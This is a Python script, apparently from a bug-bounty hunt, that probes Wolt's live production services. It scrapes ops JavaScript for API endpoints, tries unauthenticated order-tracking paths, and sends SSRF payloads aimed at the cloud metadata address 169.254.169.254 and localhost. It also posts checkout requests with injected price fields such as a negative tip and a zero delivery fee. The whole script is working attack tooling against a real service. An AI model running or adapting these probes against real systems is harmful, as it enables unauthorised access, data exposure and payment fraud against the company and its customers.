"""Download ops JS and extract API info + probe more vectors."""
import requests, re, os

H = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'X-HackerOne-Research': 'pccp',
}

os.makedirs('D:/scan/_wolt_hunt/ops_js', exist_ok=True)

# Download shell JS
js_files = [
    '/static/apps/shell/releases/75419df64a36cc110e3099f660ad406c6a4ec8cb/main.js',
    '/static/apps/shell/releases/75419df64a36cc110e3099f660ad406c6a4ec8cb/runtime.js',
]

print("=== DOWNLOADING OPS JS ===")
for jp in js_files:
    url = f'https://ops.wolt.com{jp}'
    r = requests.get(url, headers=H, timeout=15)
    fn = jp.split('/')[-1]
    fp = f'D:/scan/_wolt_hunt/ops_js/{fn}'
    with open(fp, 'w', encoding='utf-8') as f:
        f.write(r.text)
    print(f"  {fn}: {len(r.text)} bytes")

# Extract from JS
print("\n=== API URLS IN OPS JS ===")
all_apis = set()
for jp in js_files:
    fn = jp.split('/')[-1]
    fp = f'D:/scan/_wolt_hunt/ops_js/{fn}'
    if not os.path.exists(fp):
        continue
    with open(fp, encoding='utf-8') as f:
        txt = f.read()

    # HTTP URLs
    for m in re.finditer(r'https?://[a-zA-Z0-9._-]+\.wolt\.com[^\s"\')\\]]{0,120}', txt, re.I):
        all_apis.add(m.group())

    # Path patterns: /api/*, /graphql, /v1/* etc
    for pat in [r'/api[a-zA-Z0-9/_-]{4,80}', r'/graphql[a-zA-Z0-9/_-]{0,40}',
                r'/v[12]/[a-zA-Z][a-zA-Z0-9/_-]{3,80}']:
        for m in re.finditer(pat, txt, re.I):
            all_apis.add(m.group())

    # Host extraction
    print(f"\n  --- {fn} ({len(txt)} bytes) ---")
    hosts = set()
    for m in re.finditer(r'https?://([a-zA-Z0-9][-a-zA-Z0-9]*(?:\.[a-zA-Z0-9][-a-zA-Z0-9]*)+)', txt):
        hosts.add(m.group(1))
    for h in sorted(hosts)[:20]:
        print(f"    HOST: {h}")

print(f"\n=== TOTAL UNIQUE: {len(all_apis)} ===")
for a in sorted(all_apis)[:60]:
    print(f"  {a}")

# ====== NEW: order tracking without auth ======
print("\n\n=== ORDER TRACKING WITHOUT AUTH ===")
BASE = 'https://consumer-api.wolt.com'
order_tests = [
    '/v1/orders/status/12345',
    '/v1/order/status/12345',
    '/v2/orders/12345',
    '/v1/order/12345/status',
    '/v1/guest/order/12345',
    '/v1/guest/orders/status',
]
for path in order_tests:
    r = requests.get(BASE + path, headers=H, timeout=10)
    if r.status_code != 404:
        print(f"  GET {path} -> {r.status_code} | {r.text[:150]}")

# ====== NEW: URL/image proxy for SSRF ======
print("\n=== URL/IMAGE PROXY SSRF ===")
proxy_tests = [
    ('https://wolt.com/proxy?url=http://169.254.169.254/', 'url param'),
    ('https://consumer-api.wolt.com/v1/image?url=http://169.254.169.254/', 'image proxy'),
    ('https://wolt.com/api/image-proxy?url=http://localhost/', 'image-proxy'),
]
for url, label in proxy_tests:
    r = requests.get(url, headers=H, timeout=10, allow_redirects=False)
    if r.status_code not in [404, 403]:
        print(f"  {label}: {r.status_code} | {r.text[:150]}")

# ====== NEW: Checkout metadata/extra field injection ======
print("\n=== CHECKOUT FIELD INJECTION ===")
FAKE_ITEM_ID = '670fa3e9ead6e49d65cc3614'
VENUE_ID = '60ebeb71c6904c2caf035f71'

def try_inject(label, extra_fields):
    item = {'id': FAKE_ITEM_ID, 'name': 'InjectTest', 'count': 1,
            'price': 100, 'base_price': 100, 'end_amount': 100,
            'options': [], 'restrictions': [], 'category_id': '',
            'exclude_from_discounts': False}
    body = {
        'items': [item], 'base_price': 100, 'end_amount': 100,
        'supplier_id': VENUE_ID, 'selected_delivery_method': 'homedelivery',
        'delivery_location': {'lat': 60.168142, 'lon': 24.939986},
        'currency': 'EUR', 'vendor': 'wolt', 'discount': 0, 'surcharges': [],
        'basket_id': f'inject-{label}', 'pickup': False, 'scheduled_time': None,
        'shipping_method': 'homedelivery', 'discount_code': None,
        'purchase_plan': {
            'venue': {'id': VENUE_ID, 'country': 'FIN', 'currency': 'EUR'},
            'delivery_method': 'homedelivery',
            'menu_items': [dict(item)]
        }
    }
    body.update(extra_fields)
    r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout',
                      headers={**H, 'Content-Type': 'application/json', 'Origin': 'https://wolt.com'},
                      json=body, timeout=15)
    if r.status_code == 200:
        d = r.json()
        return f"200 | payable={d.get('payable_amount')} | fields={list(d.keys())[:10]}"
    return f"{r.status_code} | {r.text[:150]}"

inject_tests = [
    ('tip=999', {'tip_amount': 999}),
    ('tip=-999', {'tip_amount': -999}),
    ('currency=USD', {'currency': 'USD'}),
    ('tax=999', {'tax_amount': 999}),
    ('service_fee=999', {'service_fee': 999}),
    ('delivery_fee=0', {'delivery_fee': 0}),
    ('is_gift=true', {'is_gift': True}),
    ('payment_method=cash', {'payment_method': 'cash_on_delivery'}),
]
for label, extra in inject_tests:
    print(f"  {label:25s} -> {try_inject(label, extra)}")

print("\n=== DONE ===")
